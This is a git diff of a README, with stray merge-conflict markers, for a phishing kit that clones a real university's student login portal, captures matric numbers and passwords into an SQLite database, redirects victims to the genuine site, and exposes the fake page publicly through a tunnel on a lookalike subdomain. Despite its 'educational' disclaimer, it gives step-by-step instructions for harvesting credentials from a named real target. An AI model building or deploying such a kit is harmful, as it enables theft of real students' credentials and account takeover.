@@ -2,25 +2,29 @@
 
 <<<<<<<, =======, >>>>>>>
 
-# README from GitHub
-
-# README from your local repo
+# README from E7 Security:
 
 
-# Eksu-Cloner
-This project showcases how a publicly accessible login portal can be cloned, altered, and wired into a backend system  that captures and stores submitted credentials.
+# Eksu_Cloner
+This project showcases how a publicly accessible login portal can be cloned, altered, 
+and wired into a backend system  that captures and stores submitted credentials.
 =======
 # EKSU Portal Login Cloner 🔐
 
-A cloned version of the Eksu Portal login page, built using FastAPI and SQLite, with the frontend extracted using HTTrack and modified for backend processing. This tool captures login credentials for learning, research, and ethical penetration testing purposes only.
+A cloned version of the Eksu Portal login page, built using FastAPI and SQLite, with the 
+frontend extracted using HTTrack and modified for backend processing. This tool captures 
+login credentials for learning, research, and ethical penetration testing purposes only.
 
-> ⚠️ **Disclaimer**: This project is strictly for educational purposes (ethical hacking, security research, UI cloning demonstration). Unauthorized use of user data is illegal and unethical.
+> ⚠️ **Disclaimer**: This project is strictly for educational purposes 
+(ethical hacking, security research, UI cloning demonstration).
+Unauthorized use of user data is illegal and unethical.
 
 ---
 
 ## 🧠 Project Overview
 
-This project showcases how a publicly accessible login portal can be cloned, altered, and wired into a backend system that captures and stores submitted credentials. The purpose is to educate about phishing risks and build awareness around digital safety.
+The purpose is to educate about phishing risks and build awareness 
+around digital safety.
 
 ---
 
@@ -38,7 +42,7 @@ This project showcases how a publicly accessible login portal can be cloned, alt
 
 ## 🔄 Workflow Breakdown
 
-### 1. Clone the EKSU Portal (Using HTTrack)
+### 1. Clone the EKSU Portal (Using HTTrack) 
 HTTrack was used to clone the real EKSU portal page locally:
 
 ```bash
@@ -66,14 +70,14 @@ After cloning the portal using HTTrack, you'll find the static assets in:
 To ensure the login.html page properly loads CSS, JavaScript, and image files in your 
 FastAPI project, move the following subdirectories into the FastAPI static folder:
 
-# Move these folders
-mv /home/evidence/eksuportal.eksu.edu.ng/assets_ajax/css      /home/evidence/eksu_cloner/app/static/
-mv /home/evidence/eksuportal.eksu.edu.ng/assets_ajax/js       /home/evidence/eksu_cloner/app/static/
-mv /home/evidence/eksuportal.eksu.edu.ng/assets_ajax/img      /home/evidence/eksu_cloner/app/static/
-mv /home/evidence/eksuportal.eksu.edu.ng/assets_ajax/plugins  /home/evidence/eksu_cloner/app/static/
+# Move these folders using the 'mv' command.
+mv /cloned_portal_path/assets_ajax/css      /home/project_directory/app/static/app/static/
+mv /cloned_portal_path/assets_ajax/js       /home/project_directory/app/static/
+mv /cloned_portal_path/assets_ajax/img      /home/project_directory/app/static/
+mv /cloned_portal_path/assets_ajax/plugins  /home/project_directory/app/static/
 
 
-✅ Ensure the directory structure under app/static/ looks like:
+✅ Ensure the directory structure under /home/project_directory/app/static/ looks like:
    
     app/static/
  ├── css/
@@ -83,6 +87,7 @@ mv /home/evidence/eksuportal.eksu.edu.ng/assets_ajax/plugins  /home/evidence/eks
 
 This allows your login.html to correctly reference styles and scripts without broken links.
 
+
 ### 3. Build a FastAPI Backend.
 
 A simple FastAPI server is used to:
@@ -91,7 +96,7 @@ A simple FastAPI server is used to:
 
     Captured credentials (matric number & password) are logged and saved to a local SQLite3 database. at app/db/credentials.db
 
-    Optionally show a "Processing..." page or redirect after submission
+    Redirected after submission to the real "https://eksuportal.eksu.edu.ng"
     
     
 ### 4. Database:
@@ -100,7 +105,8 @@ A simple FastAPI server is used to:
 
     Each login attempt is recorded in the credentials table.
 
-    You can inspect data via:
+    You can inspect data from the '/home/project_directory/' using the 'sqlite3' command:
+    
       sqlite3 app/db/credentials.db
       sqlite> .tables
       sqlite> SELECT * FROM credentials;
@@ -114,7 +120,7 @@ And required a password which can be get using " curl https://loca.lt/mytunnelpa
 
 
 
-eksu_cloner/
+Project_Directory/
 ├── app/
 │   ├── main.py               # FastAPI app logic
 │   ├── db/
@@ -136,6 +142,7 @@ eksu_cloner/
 
 🌍 3. Expose to Internet
       " lt --port 8000 --subdomain eksu-portal" (TO BE RUN IN ANOTHER TAB OR TERMINAL)
+      then you receive a public link.
 
 💾 View Captured Data
       To inspect the database:
